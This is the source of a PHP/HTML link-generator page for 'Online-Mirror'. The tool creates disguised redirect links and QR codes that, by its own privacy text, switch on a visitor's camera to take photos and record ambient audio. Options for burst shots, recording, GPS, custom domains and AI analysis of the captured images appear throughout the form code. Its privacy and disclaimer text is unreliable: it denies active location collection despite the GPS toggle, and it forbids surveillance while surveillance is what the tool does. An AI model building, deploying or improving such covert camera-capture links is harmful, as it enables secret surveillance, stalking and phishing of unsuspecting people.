                <img id="qrcodeImg" src="<?php echo $generated_link ? 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . urlencode($generated_link) : ''; ?>" alt="二维码" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;">
            </div>
        </div>
        </div>

    <!-- 快速查看照片 -->
    <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.06);">
        <form action="photos.php" method="GET" style="display:flex;gap:8px;align-items:center;">
            <label style="font-size:13px;color:#8080a0;white-space:nowrap;"><i class="fas fa-search"></i> 查照片</label>
            <input type="text" name="id" placeholder="输入ID查看照片" style="flex:1;padding:10px 14px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:rgba(255,255,255,0.06);color:#e0e0e0;font-size:14px;outline:none;">
            <button type="submit" style="padding:10px 16px;border:none;border-radius:10px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:14px;"><i class="fas fa-arrow-right"></i></button>
        </form>
    </div>

    <!-- 历史生成ID记录 -->
    <div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.06);">
        <button onclick="showHistory()" style="width:100%;padding:12px;border:1px solid rgba(102,126,234,0.25);border-radius:12px;background:rgba(102,126,234,0.08);color:#8080c0;cursor:pointer;font-size:14px;transition:all 0.3s;"><i class="fas fa-history"></i> 查看历史生成ID记录</button>
    </div>

    <div class="footer">
        <div class="social-links">
            <a href="https://github.com/beihaiBH/Online-Mirror/" target="_blank" rel="noopener">
                <i class="fab fa-github"></i> GitHub
            </a>
            <a href="https://gitee.com/beihaiLG/online-mirror" target="_blank" rel="noopener">
                <i class="fab fa-git-alt"></i> Gitee
            </a>
            <a href="javascript:void(0)" class="dev-btn" onclick="showDeveloper()">
                <i class="fas fa-code"></i> 开发者
            </a>
            <a href="javascript:void(0)" class="dev-btn" onclick="showDonation()" style="background:rgba(255,193,7,0.12);border-color:rgba(255,193,7,0.2);color:#ffc107;">
                <i class="fas fa-coffee"></i> 打赏
            </a>
        </div>
        <div style="margin-top:10px;font-size:12px;color:#606080;">
            <a href="javascript:void(0)" onclick="showDisclaimer()" style="color:#8080a0;text-decoration:none;">免责声明</a>
            <span class="divider">|</span>
            <a href="javascript:void(0)" onclick="showPrivacy()" style="color:#8080a0;text-decoration:none;">隐私协议</a>
        </div>
        <div>
        <?php if (isLoggedIn()): ?>
            <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
            <span class="divider">|</span>
            <a href="dashboard.php"><i class="fas fa-tachometer-alt"></i> 控制台</a>
            <span class="divider">|</span>
            <a href="login.php?action=logout"><i class="fas fa-sign-out-alt"></i> 退出</a>
        <?php else: ?>
            <a href="login.php"><i class="fas fa-lock"></i> 管理员登录</a>
        <?php endif; ?>
        </div>
    </div>
</div>

<!-- 开发者弹窗 -->
<div class="dev-modal" id="devModal">
    <div class="modal-box">
        <div class="modal-header">
            <h3><i class="fas fa-code" style="color:#667eea;"></i> 开发者</h3>
            <button class="close-btn" onclick="closeDev()">&times;</button>
        </div>
        <div class="modal-body">
            <div class="dev-card" onclick="copyDevEmail()" title="点击复制邮箱">
                <img class="avatar" src="http://q1.qlogo.cn/g?b=qq&nk=629401918&s=640" alt="头像">
                <div class="name">beihai</div>
                <div class="badge">⭐ 核心开发</div>
                <div class="motto">「心中无女人，代码自然神」</div>
                <div class="click-hint"><i class="fas fa-envelope"></i> 点击复制邮箱</div>
            </div>
        </div>
    </div>
</div>

<!-- 免责/隐私弹窗 -->
<div class="dev-modal" id="disclaimerModal">
    <div class="modal-box" style="display:flex;flex-direction:column;max-height:80vh;overflow:hidden;">
        <div class="modal-header">
            <h3><i class="fas fa-shield-alt" style="color:#ff9800;"></i> 免责声明</h3>
            <button class="close-btn" onclick="closeDisclaimer()">&times;</button>
        </div>
        <div class="modal-body" style="flex:1;overflow-y:auto;text-align:left;font-size:13px;line-height:1.8;color:#c0c0d0;padding:20px 20px 12px;">
            <p><strong>使用本服务即表示您已阅读、理解并同意以下全部条款：</strong></p>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">一、服务性质与用途</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>本工具为个人开发的开源项目，仅供学习、研究、娱乐等非商业用途。</li>
                <li>本工具以"现有状态"提供，不构成任何形式的商业产品或服务承诺。</li>
                <li>开发者保留随时修改、暂停或终止服务的权利，恕不另行通知。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">二、用户行为规范</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>用户承诺不会将本工具用于任何违反中华人民共和国法律法规的活动。</li>
                <li>禁止使用本工具拍摄、存储、传播任何侵犯他人肖像权、隐私权、名誉权等合法权益的内容。</li>
                <li>禁止使用本工具从事跟踪、监视、骚扰他人等不当行为。</li>
                <li>禁止利用本工具传播色情、暴力、赌博、毒品、恐怖主义等违法有害信息。</li>
                <li>禁止试图破解、反向工程、篡改本工具的任何功能或安全机制。</li>
                <li>禁止利用自动化脚本、爬虫等方式滥用本工具的服务。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">三、责任声明</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>用户应自行承担使用本工具产生的一切法律责任和后果。</li>
                <li>在任何情况下，开发者均不对因使用或无法使用本工具所造成的任何直接、间接、偶然、特殊或惩罚性损失承担责任，包括但不限于数据丢失、设备损坏、名誉损害、商业损失等。</li>
                <li>用户通过本工具拍摄的照片、录制的音频等内容由用户自行负责管理，开发者不对内容的合法性、安全性做任何保证。</li>
                <li>本工具生成的链接仅为临时性技术功能，开发者不对链接的可用性、持续性做任何明示或暗示的担保。</li>
                <li>用户通过本工具生成链接跳转到的第三方页面，其内容与开发者无关，用户应自行判断其安全性。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">四、链接使用规范</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>生成的链接仅供临时使用，默认设有有效期，过期后链接将自动失效。</li>
                <li>请勿将生成的链接用于登录验证、支付确认、身份认证等重要或敏感场景。</li>
                <li>用户应妥善保管生成的链接及对应的 ID，因链接泄露导致的后果由用户自行承担。</li>
                <li>禁止将本工具生成的链接用于钓鱼、欺诈等非法活动。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">五、技术免责</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>由于网络环境、服务器状态等因素，开发者不保证服务100%可用或无错误。</li>
                <li>开发者不承担因第三方服务故障（如服务器宕机、网络攻击等）导致的服务中断责任。</li>
                <li>用户理解并接受，本工具可能存在的安全漏洞或技术缺陷，开发者会在合理范围内修复但不做绝对保证。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">六、条款变更</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>开发者有权根据需要随时修改本免责声明的全部或部分内容。</li>
                <li>修改后的条款自发布之日起生效，继续使用本工具即视为接受修改后的条款。</li>
                <li>建议用户定期查阅本免责声明以了解最新条款。</li>
            </ol>

            <p style="font-size:12px;color:#8080a0;margin-top:12px;">详细隐私政策请查看 <a href="javascript:void(0)" onclick="showPrivacy()" style="color:#667eea;">隐私协议</a></p>
        </div>
        <div style="padding:12px 20px 16px;border-top:1px solid rgba(255,255,255,0.06);background:#1a1a2e;display:flex;gap:10px;">
            <button onclick="closeDisclaimer()" style="flex:1;padding:10px;border:1px solid rgba(255,255,255,0.12);border-radius:10px;background:transparent;color:#8080a0;cursor:pointer;font-size:14px;">关闭</button>
            <button onclick="acceptDisclaimer()" id="disclaimerAcceptBtn" style="flex:1;padding:10px;border:none;border-radius:10px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">✅ 已阅读并同意</button>
        </div>
    </div>
</div>

<div class="dev-modal" id="privacyModal">
    <div class="modal-box">
        <div class="modal-header">
            <h3><i class="fas fa-user-shield" style="color:#667eea;"></i> 隐私协议</h3>
            <button class="close-btn" onclick="closePrivacy()">&times;</button>
        </div>
        <div class="modal-body" style="text-align:left;font-size:13px;line-height:1.8;color:#c0c0d0;max-height:60vh;overflow-y:auto;">
            <p><strong>最后更新日期：2026年6月27日</strong></p>
            <p>我们非常重视您的隐私。本隐私协议说明了本工具如何收集、使用、存储和保护您的个人信息。使用本工具即表示您同意本协议所述的做法。</p>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">一、我们收集的信息</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li><strong>照片数据：</strong>当有人通过生成的链接访问时，本工具会调用浏览器摄像头拍摄照片并录制环境声音。这些数据直接存储在您部署本工具的服务器上，不会被上传至任何第三方平台或服务。</li>
                <li><strong>IP地址：</strong>系统会自动记录访问者的IP地址，用于频率限制、封禁管理和基础访问统计。</li>
                <li><strong>访问日志：</strong>包括访问时间、链接ID、浏览器User-Agent等基础信息，用于服务运行监控和异常检测。</li>
                <li><strong>邮箱地址：</strong>如果您选择了邮箱通知功能，您提供的邮箱地址仅用于接收新照片通知，不会用于其他任何用途。</li>
                <li><strong>浏览器指纹：</strong>系统可能会收集浏览器指纹信息（如屏幕分辨率、操作系统、浏览器版本等非个人识别信息），用于安全验证和反滥用。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">二、我们不会收集的信息</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>我们不会收集您的姓名、身份证号、银行卡号等个人身份信息。</li>
                <li>我们不会收集您的地理位置信息（GPS坐标仅从拍摄的照片EXIF中提取，不会主动获取您的位置）。</li>
                <li>我们不会读取您的通讯录、短信、通话记录等手机敏感信息。</li>
                <li>我们不会收集您的社交账号密码或其他登录凭据。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">三、信息存储与保护</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>所有拍摄的照片和录制的音频默认存储在您部署本工具的服务器本地，不经过任何第三方中转。</li>
                <li>生成的链接默认设有有效期（由创建者设定），过期后数据不会被主动删除但无法通过过期链接访问。</li>
                <li>我们采用数据库密码加密存储、安全响应头、防SQL注入等常规安全措施保护数据。</li>
                <li>但我们无法对数据安全做出绝对保证，建议您定期备份重要数据并确保服务器安全配置。</li>
                <li>系统日志保留期限为30天，过期后自动清理。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">四、数据使用与共享</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>收集的数据仅用于本工具的正常运行、安全防护和基础统计分析。</li>
                <li>我们不会将您的任何数据出售、出租或分享给任何第三方。</li>
                <li>除非法律有明确要求，我们不会向任何机构或个人披露您的数据。</li>
                <li>本工具不使用任何第三方分析服务（如Google Analytics、百度统计等）。</li>
                <li>本工具不使用任何第三方广告服务或跟踪器。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">五、Cookie与本地存储</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>本工具可能使用Session Cookie来维持登录状态，不会用于追踪用户行为。</li>
                <li>本工具可能使用浏览器本地存储（LocalStorage）保存用户偏好设置。</li>
                <li>所有Cookie和本地存储数据仅用于工具本身的正常运行，不涉及跨站追踪。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">六、用户权利</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>您有权随时删除您部署的服务器上存储的所有照片和日志数据。</li>
                <li>您可以通过服务器后台查看、管理已生成的链接及其拍摄的照片。</li>
                <li>您可以选择关闭邮箱通知功能，关闭后已提供的邮箱地址将从系统中移除。</li>
                <li>您可以设置封禁规则来阻止特定IP访问您的服务。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">七、未成年人保护</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>本工具不建议未满18周岁的未成年人单独使用。</li>
                <li>如未成年人在监护人陪同下使用，监护人应对其使用行为负责。</li>
                <li>我们不会故意收集未成年人的个人信息。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">八、隐私政策更新</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>我们可能会不时更新本隐私协议，更新后的版本将在页面中显示新的更新日期。</li>
                <li>重大变更将通过本工具页面公告的方式通知用户。</li>
                <li>继续使用本工具即表示您同意更新后的隐私协议。</li>
            </ol>

            <p style="margin:14px 0 6px;font-weight:600;color:#e0e0e8;">九、联系方式</p>
            <ol style="padding-left:18px;margin:4px 0 8px;">
                <li>如您对本隐私协议有任何疑问、意见或投诉，欢迎联系开发者。</li>
                <li>联系邮箱：stockstock12001@gmail.com</li>
                <li>我们会在合理时间内回复您的隐私相关询问。</li>
            </ol>

            <div style="text-align:center;margin-top:16px;">
                <button onclick="closePrivacy()" style="padding:10px 30px;border:none;border-radius:10px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;cursor:pointer;font-size:14px;font-weight:600;">关闭</button>
            </div>
        </div>
    </div>
</div>

<!-- 打赏弹窗 -->
<div class="dev-modal" id="donationModal">
    <div class="modal-box">
        <div class="modal-header">
            <h3><i class="fas fa-coffee" style="color:#ffc107;"></i> 打赏支持</h3>
            <button class="close-btn" onclick="closeDonation()">&times;</button>
        </div>
        <div class="modal-body" style="text-align:center;">
            <p style="font-size:13px;color:#8080a0;margin-bottom:16px;">如果这个项目帮到了你，欢迎打赏支持开发者～</p>
            <div id="donationQRCodes" style="display:flex;flex-wrap:wrap;gap:16px;justify-content:center;">
                <?php
                $donation_channels = json_decode(getSetting('donation_channels') ?: '[]', true);
                foreach ($donation_channels as $ch): 
                    $ch_img = htmlspecialchars($ch['image'] ?? '');
                    $ch_name = htmlspecialchars($ch['name'] ?? '打赏');
                    if (!empty($ch_img)):
                ?>
                <div style="text-align:center;">
                    <img src="<?php echo $ch_img; ?>" alt="<?php echo $ch_name; ?>" style="width:160px;height:160px;border-radius:12px;background:#fff;padding:8px;object-fit:contain;">
                    <div style="font-size:12px;color:#a0a0b8;margin-top:6px;"><?php echo $ch_name; ?></div>
                </div>
                <?php 
                    endif;
                endforeach; 
                ?>
            </div>
            <?php if (empty($donation_channels)): ?>
            <p style="color:#606080;font-size:13px;">管理员暂未设置打赏方式</p>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- 复制邮箱提示 -->
<div class="copy-toast" id="copyToast">✅ 邮箱已复制到剪贴板</div>

<script>
function showDeveloper() {
    document.getElementById('devModal').classList.add('show');
    document.body.style.overflow = 'hidden';
}
function closeDev() {
    document.getElementById('devModal').classList.remove('show');
    document.body.style.overflow = '';
}
function showDonation() {
    document.getElementById('donationModal').classList.add('show');
    document.body.style.overflow = 'hidden';
}
function closeDonation() {
    document.getElementById('donationModal').classList.remove('show');
    document.body.style.overflow = '';
}
function showDisclaimer(fromGenerate) {
    document.getElementById('disclaimerModal').classList.add('show');
    document.body.style.overflow = 'hidden';
    var btn = document.getElementById('disclaimerAcceptBtn');
    if (btn) {
        btn.style.display = fromGenerate ? 'block' : 'none';
        window._generateMode = fromGenerate || false;
    }
}
function closeDisclaimer() {
    document.getElementById('disclaimerModal').classList.remove('show');
    document.body.style.overflow = '';
}
function showPrivacy() {
    closeDisclaimer();
    document.getElementById('privacyModal').classList.add('show');
    document.body.style.overflow = 'hidden';
}
function closePrivacy() {
    document.getElementById('privacyModal').classList.remove('show');
    document.body.style.overflow = '';
}
function acceptDisclaimer() {
    document.getElementById('disclaimerAccepted').value = '1';
    // 提交前保存邮箱
    var emailInput = document.querySelector('input[name="notify_email"]');
    var emailBtn = document.getElementById('toggleEmailBtn');
    if (emailInput && emailBtn && emailBtn.classList.contains('on') && emailInput.value) {
        localStorage.setItem('mirror_notify_email', emailInput.value);
    }
    closeDisclaimer();
    if (window._generateMode) {
        var sp = document.getElementById('sliderPass');
        if (!sp || sp.value !== '1') {
            showToast('请先完成滑块验证！', false);
            window._generateMode = false;
            return;
        }
        document.querySelector('form').submit();
    }
}
function copyDevEmail() {
    var email = 'stockstock12001@gmail.com';
    navigator.clipboard.writeText(email).then(function() {
        var toast = document.getElementById('copyToast');
        toast.classList.add('show');
        setTimeout(function() { toast.classList.remove('show'); }, 2000);
    }).catch(function() {
        var ta = document.createElement('textarea');
        ta.value = email;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        var toast = document.getElementById('copyToast');
        toast.classList.add('show');
        setTimeout(function() { toast.classList.remove('show'); }, 2000);
    });
}
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') { closeDev(); closeDonation(); closeHistory(); }
});
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('dev-modal')) { closeDev(); closeDonation(); closeDisclaimer(); closePrivacy(); }
});
</script>

<script>
function validateForm() {
    const url = document.getElementById('redirect_url').value.trim();
    if (!url) {
        showToast('请输入跳转地址！', false);
        return false;
    }
    var sliderPass = document.getElementById('sliderPass').value;
    if (sliderPass !== '1') {
        showToast('请先完成滑块验证！', false);
        return false;
    }
    return true;
}

function copyID() {
    const id = '<?php echo htmlspecialchars($generated_id); ?>';
    navigator.clipboard.writeText(id).then(() => {
        showToast('✅ ID 已复制！', true);
    }).catch(() => {
        showToast('复制失败，请手动选中复制', false);
    });
}

function copyLink() {
    const input = document.getElementById('generatedLink');
    input.select();
    input.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(input.value).then(() => {
        showToast('✅ 链接已复制到剪贴板！', true);
    }).catch(() => {
        document.execCommand('copy');
        showToast('✅ 已复制！', true);
    });
}

function showToast(msg, success) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast' + (success ? ' success' : '');
    setTimeout(() => t.classList.add('show'), 10);
    setTimeout(() => t.classList.remove('show'), 2500);
}

// ========== 频率限制倒计时 ==========
<?php if ($rate_error && strpos($rate_error, '操作太频繁') !== false): ?>
document.addEventListener('DOMContentLoaded', function() {
    var submitBtn = document.querySelector('.btn-generate');
    var countdownEl = document.getElementById('rateLimitCountdown');
    var msgEl = document.getElementById('rateLimitMsg');
    if (!countdownEl || !submitBtn) return;
    
    var seconds = 91;
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.5';
    submitBtn.style.cursor = 'not-allowed';
    countdownEl.style.display = 'inline';
    countdownEl.textContent = '(' + seconds + 's)';
    
    var timer = setInterval(function() {
        seconds--;
        countdownEl.textContent = '(' + seconds + 's)';
        if (seconds <= 0) {
            clearInterval(timer);
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
            submitBtn.style.cursor = 'pointer';
            msgEl.textContent = '⏳ 可以重新生成链接了';
            countdownEl.style.display = 'none';
            setTimeout(function() {
                var box = document.getElementById('rateLimitBox');
                if (box) box.style.display = 'none';
            }, 3000);
        }
    }, 1000);
});
<?php endif; ?>

// ========== 邮箱通知自动保存 (localStorage) ==========
document.addEventListener('DOMContentLoaded', function() {
    var emailInput = document.querySelector('input[name="notify_email"]');
    var emailBtn = document.getElementById('toggleEmailBtn');
    var emailField = document.getElementById('toggleEmailField');
    
    if (emailInput && emailBtn && emailField) {
        // 还原上次输入的邮箱
        var savedEmail = localStorage.getItem('mirror_notify_email');
        if (savedEmail) {
            emailInput.value = savedEmail;
            if (!emailBtn.classList.contains('on')) {
                emailBtn.classList.add('on');
            }
            if (!emailField.classList.contains('show')) {
                emailField.classList.add('show');
            }
        }
        
        // 实时保存邮箱（输入时自动存）
        emailInput.addEventListener('input', function() {
            if (emailBtn.classList.contains('on') && emailInput.value) {
                localStorage.setItem('mirror_notify_email', emailInput.value);
            }
        });
        
        // 取消邮箱通知时不清除已保存的地址
        // 这样下次再开启时自动填充
    }
});

// ========== v3.0 历史记录 (localStorage) ==========
function saveHistory(id, link) {
    try {
        var history = JSON.parse(localStorage.getItem('mirror_history') || '[]');
        history = history.filter(function(item) { return item.id !== id; });
        history.unshift({ id: id, link: link, time: new Date().toLocaleString() });
        if (history.length > 10) history = history.slice(0, 10);
        localStorage.setItem('mirror_history', JSON.stringify(history));
    } catch(e) {}
}

function showHistory() {
    var history = [];
    try { history = JSON.parse(localStorage.getItem('mirror_history') || '[]'); } catch(e) {}
    
    var modal = document.createElement('div');
    modal.className = 'dev-modal show';
    modal.id = 'historyModal';
    
    var body = '<div class="modal-box" style="max-width:520px;">' +
        '<div class="modal-header">' +
            '<h3><i class="fas fa-history" style="color:#667eea;"></i> 历史记录</h3>' +
            '<button class="close-btn" onclick="closeHistory()">&times;</button>' +
        '</div>' +
        '<div class="modal-body" style="max-height:400px;overflow-y:auto;padding:12px 16px;">';
    
    if (history.length === 0) {
        body += '<div style="text-align:center;padding:40px 20px;color:#606080;"><i class="fas fa-inbox" style="font-size:48px;margin-bottom:12px;display:block;"></i><p>暂无历史记录</p></div>';
    } else {
        for (var i = 0; i < history.length; i++) {
            var item = history[i];
            var displayLink = item.link.length > 50 ? item.link.substring(0, 50) + '...' : item.link;
            body += '<div class="history-item" data-link="' + item.link.replace(/"/g,'&quot;') + '" data-id="' + item.id.replace(/"/g,'&quot;') + '" style="padding:10px 12px;margin-bottom:8px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:10px;">' +
                '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">' +
                    '<span style="color:#667eea;font-family:monospace;font-size:13px;font-weight:600;">' + item.id + '</span>' +
                    '<span style="color:#606080;font-size:11px;">' + (item.time || '') + '</span>' +
                '</div>' +
                '<div style="display:flex;gap:6px;align-items:center;">' +
                    '<span style="flex:1;font-size:12px;color:#a0a0b8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + item.link.replace(/"/g,'&quot;') + '">' + displayLink + '</span>' +
                    '<button class="history-copy-link" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(102,126,234,0.2);color:#667eea;cursor:pointer;font-size:11px;"><i class="fas fa-copy"></i> 复制链接</button>' +
                    '<button class="history-copy-id" style="padding:4px 10px;border:none;border-radius:6px;background:rgba(76,175,80,0.15);color:#4caf50;cursor:pointer;font-size:11px;"><i class="fas fa-tag"></i> 复制ID</button>' +
                '</div>' +
            '</div>';
        }
    }
    
    body += '<div style="text-align:center;padding-top:10px;">' +
        '<button onclick="clearAllHistory()" style="padding:8px 20px;border:1px solid rgba(255,80,80,0.2);border-radius:8px;background:rgba(255,80,80,0.08);color:#ff6b6b;cursor:pointer;font-size:12px;"><i class="fas fa-trash"></i> 清空历史记录</button>' +
    '</div></div></div>';
    
    modal.innerHTML = body;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    // 使用事件委托处理复制按钮和点击遮罩
    modal.addEventListener('click', function(e) {
        if (e.target.closest('.history-copy-link')) {
            var item = e.target.closest('.history-item');
            if (item) {
                navigator.clipboard.writeText(item.getAttribute('data-link')).then(function() {
                    showToast('✅ 链接已复制', true);
                });
            }
        } else if (e.target.closest('.history-copy-id')) {
            var item = e.target.closest('.history-item');
            if (item) {
                navigator.clipboard.writeText(item.getAttribute('data-id')).then(function() {
                    showToast('✅ ID已复制', true);
                });
            }
        } else if (e.target === modal) {
            closeHistory();
        }
    });
}

function closeHistory(e) {
    if (e && e.target && e.target.id !== 'historyModal') return;
    var modal = document.getElementById('historyModal');
    if (modal) { modal.remove(); document.body.style.overflow = ''; }
}

function clearAllHistory() {
    if (!confirm('确定清空所有历史记录？')) return;
    try { localStorage.removeItem('mirror_history'); } catch(e) {}
    closeHistory();
    showToast('✅ 历史记录已清空', true);
}

// 如果已有生成的链接，自动展示结果并保存历史
<?php if ($generated_link): ?>
document.getElementById('resultBox').style.display = 'block';
saveHistory('<?php echo htmlspecialchars($generated_id); ?>', '<?php echo htmlspecialchars($generated_link); ?>');
setTimeout(function() {
    document.getElementById('resultBox').scrollIntoView({ behavior: 'smooth', block: 'center' });
}, 100);
<?php endif; ?>

// 预先清空表单的redirect_url字段

// 更多设置折叠
function toggleMoreSettings() {
    var body = document.getElementById('moreSettingsBody');
    var arrow = document.getElementById('moreSettingsArrow');
    if (body.style.display === 'block') {
        body.style.display = 'none';
        arrow.style.transform = 'rotate(0deg)';
    } else {
        body.style.display = 'block';
        arrow.style.transform = 'rotate(180deg)';
    }
}

// 开关切换函数
function toggleField(type) {
    var map = {
        'tags': ['toggleTagsBtn', 'toggleTagsField'],
        'email': ['toggleEmailBtn', 'toggleEmailField'],
        'domain': ['toggleDomainBtn', 'toggleDomainField'],
        'burst': ['toggleBurstBtn', 'toggleBurstField'],
        'recording': ['toggleRecordingBtn', 'toggleRecordingField'],
        'qrcode': ['toggleQrcodeBtn', 'showQrcodeInput'],
        'gps': ['toggleGpsBtn', 'toggleGpsField']
    };
    if (type === 'qrcode') {
        var btn = document.getElementById('toggleQrcodeBtn');
        var input = document.getElementById('showQrcodeInput');
        if (!btn || !input) return;
        btn.classList.toggle('on');
        input.value = btn.classList.contains('on') ? '1' : '0';
        return;
    }
    
    var ids = map[type];
    if (!ids) return;
    var btn = document.getElementById(ids[0]);
    var field = document.getElementById(ids[1]);
    if (!btn || !field) return;
    btn.classList.toggle('on');
    field.classList.toggle('show');
    if (!field.classList.contains('show')) {
        var input = field.querySelector('input, select');
        if (input) {
            if (input.tagName === 'SELECT') input.selectedIndex = 0;
            else input.value = '';
        }
    }
    
    // GPS特殊处理：更新hidden值
    if (type === 'gps') {
        var gpsInput = document.getElementById('gpsEnabledInput');
        if (gpsInput) gpsInput.value = btn.classList.contains('on') ? '1' : '0';
        return;
    }
    
    // 录音采样特殊处理
    if (type === 'recording') {
        var recInput = document.getElementById('recordingEnabledInput');
        if (recInput) recInput.value = btn.classList.contains('on') ? '1' : '0';
        if (!field.classList.contains('show')) {
            var sel = field.querySelector('select');
            if (sel) sel.selectedIndex = 1;
        }
        return;
    }
    
    // 连拍模式特殊处理
    if (type === 'burst') {
        var burstInput = document.getElementById('burstEnabledInput');
        if (burstInput) burstInput.value = btn.classList.contains('on') ? '1' : '0';
        if (!field.classList.contains('show')) {
            var sel = field.querySelector('select');
            if (sel) sel.selectedIndex = 0;
        }
    }
    
    // v3.0 AI & 反向图搜特殊处理
    if (type === 'ai') {
        var aiInput = document.getElementById('aiEnabledInput');
        if (aiInput) aiInput.value = btn.classList.contains('on') ? '1' : '0';
        
        // 如果管理员没配置AI，弹出提示
        <?php if (empty(getSetting('ai_api_key'))): ?>
        if (btn.classList.contains('on')) {
            setTimeout(function() {
                btn.classList.remove('on');
                if (aiInput) aiInput.value = '0';
                showToast('⚠️ 管理员尚未配置 AI 模型，请联系管理员在后台设置', false);
            }, 100);
        }
        <?php endif; ?>
    }
    if (type === 'reverse') {
        var revInput = document.getElementById('reverseEnabledInput');
        if (revInput) revInput.value = btn.classList.contains('on') ? '1' : '0';
    }
}

// v3.0 AI默认开，但如果管理员没配key则强制关
<?php if (empty(getSetting('ai_api_key'))): ?>
document.addEventListener('DOMContentLoaded', function() {
    var aiBtn = document.getElementById('toggleAiBtn');
    var aiInput = document.getElementById('aiEnabledInput');
    if (aiBtn && aiInput) {
        aiBtn.classList.remove('on');
        aiInput.value = '0';
    }
});
<?php endif; ?>

// ====== 滑动验证码（首页链接生成）======
var scIsDragging = false;
var scDragStartX = 0;
var scCurrentX = 0;
var scTrackWidth = 0;

function startDrag(e) {
    e.preventDefault();
    var track = document.getElementById('scTrack');
    if (track.classList.contains('verified')) return;
    
    scIsDragging = true;
    scDragStartX = e.clientX;
    var trackRect = track.getBoundingClientRect();
    scTrackWidth = trackRect.width - 42;
    scCurrentX = 0;
    
    document.addEventListener('mousemove', onScMove);
    document.addEventListener('mouseup', onScEnd);
}

function startDragTouch(e) {
    e.preventDefault();
    var track = document.getElementById('scTrack');
    if (track.classList.contains('verified')) return;
    
    scIsDragging = true;
    var touch = e.touches[0];
    scDragStartX = touch.clientX;
    var trackRect = track.getBoundingClientRect();
    scTrackWidth = trackRect.width - 42;
    scCurrentX = 0;
    
    document.addEventListener('touchmove', onScMoveTouch, { passive: false });
    document.addEventListener('touchend', onScEndTouch);
}

function onScMove(e) {
    if (!scIsDragging) return;
    e.preventDefault();
    var dx = e.clientX - scDragStartX;
    updateScPosition(dx);
}

function onScMoveTouch(e) {
    if (!scIsDragging) return;
    e.preventDefault();
    var touch = e.touches[0];
    var dx = touch.clientX - scDragStartX;
    updateScPosition(dx);
}

function updateScPosition(dx) {
    var pos = Math.max(0, Math.min(scTrackWidth, dx));
    scCurrentX = pos;
    
    var thumb = document.getElementById('scThumb');
    var fill = document.getElementById('scFill');
    var text = document.getElementById('scText');
    
    thumb.style.left = (2 + pos) + 'px';
    fill.style.width = (pos + 20) + 'px';
    
    var percent = pos / scTrackWidth;
    if (percent > 0.9) {
        text.textContent = '松开完成验证';
    } else if (percent > 0.5) {
        text.textContent = '继续向右拖动';
    } else {
        text.textContent = '请按住滑块拖动到最右侧';
    }
}

function onScEnd() {
    if (!scIsDragging) return;
    scIsDragging = false;
    document.removeEventListener('mousemove', onScMove);
    document.removeEventListener('mouseup', onScEnd);
    checkScComplete();
}

function onScEndTouch() {
    if (!scIsDragging) return;
    scIsDragging = false;
    document.removeEventListener('touchmove', onScMoveTouch);
    document.removeEventListener('touchend', onScEndTouch);
    checkScComplete();
}

function checkScComplete() {
    var threshold = scTrackWidth * 0.9;
    
    if (scCurrentX >= threshold) {
        var track = document.getElementById('scTrack');
        var thumb = document.getElementById('scThumb');
        var fill = document.getElementById('scFill');
        var text = document.getElementById('scText');
        var input = document.getElementById('sliderPass');
        
        track.classList.add('verified');
        thumb.classList.add('verified');
        thumb.innerHTML = '<i class="fas fa-check"></i>';
